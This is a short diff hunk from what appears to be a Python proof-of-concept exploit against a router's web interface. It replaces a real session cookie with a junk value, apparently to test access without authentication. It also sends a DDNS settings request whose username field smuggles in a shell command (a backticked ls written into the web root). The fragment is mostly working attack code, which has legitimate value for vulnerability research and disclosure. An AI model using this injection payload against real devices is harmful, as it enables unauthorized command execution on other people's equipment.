@@ -17,7 +17,7 @@ headers = {
     'Content-Type': 'application/json',
     'Origin': 'http://10.0.0.16:8000',
     'Referer': 'http://10.0.0.16:8000/idp/idp_ping.html',
-    'Cookie': response1.headers['Set-Cookie'].split(" ")[0],
+    'Cookie': 'ayylmao',
 }
 data2 = {"ddns":{"DdnsP":{"enable":"1","username":"; `ls>/www/20250328.txt`; #","password":"admin","hostname":"admin","provider":"DynDNS.org","system":"0","mailex":"rweed","backupmailex":"1","wildcard":"1","ip":"","status":""}}}
 
